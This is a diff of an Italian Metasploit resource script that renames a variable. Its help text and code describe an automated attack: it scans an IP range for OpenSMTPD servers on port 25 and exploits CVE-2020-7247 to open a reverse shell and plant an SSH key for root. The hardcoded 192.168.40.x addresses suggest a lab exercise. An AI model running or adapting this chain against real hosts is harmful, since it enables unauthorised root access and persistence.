@@ -16,7 +16,7 @@
     def help_me                                                                                                                                                                                   
         help = %Q|
         Descrizione:
-                Questo resource script Metasploit rileva tra le macchine in targetIPs quali sono server opensmtpd e le attacca sfruttando la vulnerabilità CVE-2020-7247 per aprire una reverse shell ed aggiungere una chiave ssh all'utente root.
+                Questo resource script Metasploit rileva tra le macchine in targetIP quali sono server opensmtpd e le attacca sfruttando la vulnerabilità CVE-2020-7247 per aprire una reverse shell ed aggiungere una chiave ssh all'utente root.
 
                 Una volta eseguito lo script è possibile accedere alla macchina vittima via ssh attraverso il seguente modulo:
                     auxiliary/scanner/ssh/ssh_login_pubkey
@@ -53,11 +53,11 @@
 
 
         Uso:
-                msfconsole -r attacco_opensmtpd.rc [workspace] [targetIPs] [listeningIP]
+                msfconsole -r attacco_opensmtpd.rc [workspace] [targetIP] [listeningIP]
 
         Parametri:
                 workspace      - workspace in cui salvare i dati raccolti dagli scanner e la chiave ssh aggiunta
-                targetIPs      - range di indirizzi IP da analizzare e se vulnerabili attaccare
+                targetIP      - range di indirizzi IP da analizzare e se vulnerabili attaccare
                 listeningIP    - indirizzo IP o nome interfaccia della macchina attaccante
 
         Esempio:
@@ -90,7 +90,7 @@
         # se non esiste lo crea in automatico
         run_single("workspace -a #{workspace}")
 
-        if targetIPs == "192.168.40.21" 
+        if targetIP == "192.168.40.21" 
             run_single("workspace -d #{workspace}") 
             run_single("workspace -a #{workspace}") 
             run_single("hosts -d 192.168.40.22") 
@@ -100,7 +100,7 @@
         # seleziona come modulo attivo lo scanner di porte tcp
         run_single("use auxiliary/scanner/portscan/tcp")
         # configura lo scanner di modo che
-        # controlli se gli indirizzi ip targetIPs hanno la porta 25 aperta
+        # controlli se gli indirizzi ip targetIP hanno la porta 25 aperta
         run_single("set PORTS 25")
         run_single("set THREADS 10")
         run_single("set RHOSTS #{targetIP}")
